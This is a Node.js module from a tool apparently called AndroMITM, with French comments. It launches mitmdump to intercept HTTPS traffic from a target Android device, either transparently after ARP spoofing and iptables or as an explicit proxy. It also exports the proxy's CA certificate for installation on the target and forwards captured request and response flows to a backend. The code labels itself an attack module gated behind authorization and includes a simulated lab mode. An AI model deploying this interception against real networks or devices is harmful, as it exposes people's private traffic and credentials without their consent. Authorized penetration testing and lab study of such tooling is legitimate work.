/**
 * AndroMITM — modules/proxy.js
 * Interception HTTPS via mitmdump (mitmproxy) :
 *  - mode transparent (après ARP + iptables) ou explicit proxy
 *  - addon Python qui renvoie les flux (requêtes/réponses) au backend Node
 *  - export du certificat CA pour installation sur l'appareil Android cible
 * ⚠ MODULE D'ATTAQUE — verrouillé sans autorisation (root pour le mode transparent).
 */
'use strict';

const { ModuleBase } = require('./base');
const path = require('path');
const { DATA_DIR } = require('../lib/store');

class ProxyModule extends ModuleBase {
  constructor() {
    super('proxy', {
      requires: [{ tool: 'mitmdump', reason: 'interception HTTP/HTTPS (mitmproxy)' }],
      attackModule: true, // root requis seulement en mode transparent
    });
    this.mode = null;
    this.caCertPath = null;
  }

  runtimeInfo() {
    return {
      mode: this.mode,
      listen: this.listen,
      caCertPath: this.caCertPath,
      flows: this.flowCount || 0,
      addonPath: this.addonPath,
    };
  }
  safeCfg(cfg) { return { mode: cfg.mode, listenPort: cfg.listenPort, upstreamCert: cfg.upstreamCert !== false }; }

  onStart(cfg) {
    const { SIM, whichTool } = this.ctx;
    this.mode = cfg.mode === 'transparent' ? 'transparent' : 'regular';
    this.listenPort = cfg.listenPort || 8080;
    if (this.mode === 'transparent') this.needsRoot = true; else this.needsRoot = false;

    const session = this.engine.session;
    this.addonPath = path.join(__dirname, '..', 'addons', 'mitm_addon.py');
    this.flowLog = path.join(session ? session.dir : DATA_DIR, 'flows.jsonl');
    this.flowCount = 0;

    // chemin CA mitmproxy (~/.mitmproxy/mitmproxy-ca-cert.pem)
    this.caCertPath = path.join(process.env.HOME || '/root', '.mitmproxy', 'mitmproxy-ca-cert.pem');

    if (SIM) {
      this.simTimer = setInterval(() => {
        const samples = [
          { host: 'api.exemple-lab.test', path: '/v1/ping', method: 'GET', status: 200 },
          { host: 'http.exemple-lab.test', path: '/login', method: 'POST', status: 302 },
        ];
        const f = samples[Math.floor(Math.random() * samples.length)];
        this.flowCount++;
        this.emit('info', 'proxy.flow', { ...f, sim: true });
      }, 2000);
      return;
    }

    if (!whichTool('mitmdump')) throw new Error('mitmdump introuvable — pkg install mitmproxy ou pip install mitmproxy');

    const args = [
      '--set', 'console_eventlog_verbosity=info',
      '--set', `flow_detail=1`,
      '-s', this.addonPath,
    ];
    if (this.mode === 'transparent') args.push('--mode', 'transparent');
    else args.push('--listen-port', String(this.listenPort));
    if (cfg.upstreamCert === false) args.push('--set', 'upstream_cert=false');

    this.ctx.startProcess('proxy', 'mitmdump', args, {
      env: { MITMADDON_SINK: `http://127.0.0.1:${process.env.ANDROMITM_PORT || 8443}/api/internal/flow` },
      onLine: (line) => this.emit('info', 'proxy.raw', { line }),
      onExit: (code) => { if (this.state === 'running') this.emit('warn', 'proxy.exited', { code }); },
    });
  }

  onStop() {
    if (this.simTimer) { clearInterval(this.simTimer); this.simTimer = null; }
    this.ctx.stopProcess('proxy');
  }

  /** Ingestion d'un flux envoyé par l'addon Python. */
  ingestFlow(flow) {
    this.flowCount = (this.flowCount || 0) + 1;
    this.emit('info', 'proxy.flow', flow);
  }
}

module.exports = { ProxyModule };
